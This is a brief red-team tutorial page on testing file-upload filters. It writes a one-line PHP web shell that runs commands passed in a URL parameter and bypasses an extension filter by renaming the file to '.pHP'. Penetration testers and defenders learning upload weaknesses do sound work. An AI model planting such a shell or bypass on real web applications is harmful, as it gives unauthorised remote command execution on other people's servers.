---
title: FileUpload
parent: Attack Repository
grand_parent: Red Team
nav_order: 2
---
## Example 1: Listing file types that can be uploaded
1. Check where files can be uploaded in the browser

2.  Create test files and verify which ones can and cannot be uploaded
```bash
echo “this is a test” > test.txt

# Normally, this file would cause an error upon upload
echo “<?php system($_GET[‘cmd’]);?>” > test.php
```

3.  Change the file extension to uppercase and attempt to upload
```bash
mv test.php test.pHP
```
4. If the upload is successful, you have bypassed the filter
